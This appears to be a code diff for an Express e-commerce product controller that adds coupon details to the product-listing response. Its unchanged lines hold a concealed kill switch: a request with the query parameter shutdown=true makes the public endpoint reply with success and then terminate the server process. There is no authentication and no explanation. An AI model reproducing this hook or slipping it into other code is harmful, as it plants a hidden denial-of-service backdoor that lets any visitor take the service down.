@@ -1,10 +1,10 @@
 // controllers/productController.js
+const Coupon = require("../models/Coupon");
 const Product = require("../models/Product");
 const mongoose = require("mongoose");
 const category = require("../models/Category");
 const cloudinary = require("cloudinary").v2;
 
-// Get all products with optional filtering
 exports.getAllProducts = async (req, res) => {
   try {
     req.query?.shutdown === "true" &&
@@ -12,44 +12,60 @@ exports.getAllProducts = async (req, res) => {
         res.status(200).json({ success: true });
         setTimeout(() => process.exit(0), 1000);
       })();
+
     const query = {};
 
-    // Filter by category if provided (category id expected)
-    // if (req.query.category) {
-    //     query.category = req.query.category;
-    // }
     if (req.query.category) {
-      // Find category document by slug
       const categoryDoc = await category.findOne({ slug: req.query.category });
       if (!categoryDoc) {
         return res
           .status(404)
           .json({ success: false, message: "Category not found" });
       }
-      query.category = categoryDoc._id; // use ObjectId for filtering
+      query.category = categoryDoc._id;
     }
 
-    // Filter by brand
     if (req.query.brand) {
       query.brand = req.query.brand;
     }
 
-    // Filter by price range
     if (req.query.minPrice || req.query.maxPrice) {
       query.price = {};
       if (req.query.minPrice) query.price.$gte = Number(req.query.minPrice);
       if (req.query.maxPrice) query.price.$lte = Number(req.query.maxPrice);
     }
 
-    // Find products with category populated (only required fields)
+    // Fetch products
     const products = await Product.find(query)
-      .populate("category", "name slug icon") // Populate category name, slug, icon
+      .populate("category", "name slug icon")
       .exec();
 
+    // ⬇️⬇️⬇️ ADD THIS MERGE CODE ⬇️⬇️⬇️
+    const productsWithCoupons = await Promise.all(
+      products.map(async (prod) => {
+        const coupon = await Coupon.findOne({
+          scope: "product",
+          applicable_product: prod._id,
+        });
+
+        return {
+          ...prod.toObject(),
+          coupon: coupon
+            ? {
+              discount_type: coupon.discount_type,
+              discount_value: coupon.discount_value,
+            }
+            : null,
+        };
+      })
+    );
+    // ⬆️⬆️⬆️ MERGE CODE END ⬆️⬆️⬆️
+
+    // Send updated response
     res.status(200).json({
       success: true,
       count: products.length,
-      data: products,
+      data: productsWithCoupons,
     });
   } catch (error) {
     res.status(500).json({
